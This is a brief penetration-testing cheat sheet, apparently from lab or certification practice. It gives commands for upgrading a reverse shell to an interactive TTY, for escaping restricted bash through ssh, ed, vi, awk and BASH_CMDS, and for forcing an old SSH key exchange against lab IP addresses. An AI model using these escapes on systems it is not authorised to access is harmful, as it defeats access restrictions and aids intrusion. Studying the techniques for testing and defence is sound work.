# Breakout 
------------

## tty linux

```python
python -c 'import pty; pty.spawn("/bin/bash");'
```

```python
python3 -c 'import pty; pty.spawn("/bin/bash");'
```

```bash
export TERM=xterm-256color
```

```bash
/bin/bash -i 

/usr/bin/bash -i
```

```bash
stty raw -echo; fg

stty rows ROWS cols COLS
```

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/root/.local/bin:$PATH
```

```perl
perl -e 'exec "/bin/bash";'
```


------------------------

## rbash escape

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

error 
```bash
bash: /usr/bin/python: restricted: cannot specify `/' in command names

BASH_CMDS[a]=/bin/sh;
```

ed
```bash
$ ed
!'/bin/bash'
#
```

vi
```bash
$ vi
:set shell=/bin/bash
:shel
```

awk
```bash
awk 'BEGIN {system("/bin/bash")}'
```

https://blog.certcube.com/restricted-shells-escaping-techniques-2/
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
-----------------------

**diffie-hellman-group1-sha1** thingy:
```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 bob@10.11.1.141
```